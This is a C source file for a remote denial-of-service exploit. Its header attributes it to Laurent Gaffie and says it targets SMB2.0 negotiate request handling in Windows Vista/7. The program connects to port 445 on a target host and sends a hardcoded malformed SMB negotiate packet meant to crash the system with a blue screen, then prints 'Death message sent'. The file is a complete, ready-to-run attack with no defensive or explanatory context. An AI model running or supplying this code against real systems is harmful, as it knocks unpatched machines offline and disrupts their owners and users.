/*
 * Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.
 * (c) Laurent Gaffie http://g-laurent.blogspot.com
 */

#include <stdio.h>
#include <strings.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

int main(int argc, char** argv)
{
    int sock;
    int ret;
    int port = 445;
    char* buff = "\x00\x00\x00\x90\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00";
    struct sockaddr_in host_addr;
    struct hostent *host;


    if(argc != 2) { 
        printf("Usage: <exploit> <host ip>\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(!sock) {
        printf("Socket creation failed\n");
        return 1;
    }

    host = gethostbyname(argv[1]);
    if(!host) {
        printf("Host not found\n");
        return 1;
    }

    bzero((char *) &host_addr, sizeof(host_addr));
    host_addr.sin_family = AF_INET;
    bcopy((char *)host->h_addr,
         (char *)&host_addr.sin_addr.s_addr,
         host->h_length);
    host_addr.sin_port = htons(port);
    ret = connect(sock,(struct sockaddr*)&host_addr,sizeof(host_addr));
    if(ret) {
        perror("Unable to connect");
        return 1;
    }
    ret = write(sock,buff,148);
    if(ret) {
        printf("Death message sent: %i bytes\n",ret);
    } else {
        printf("Error sending shellcode\n");
        return 1;
    }
    close(sock);

    return 0;
}
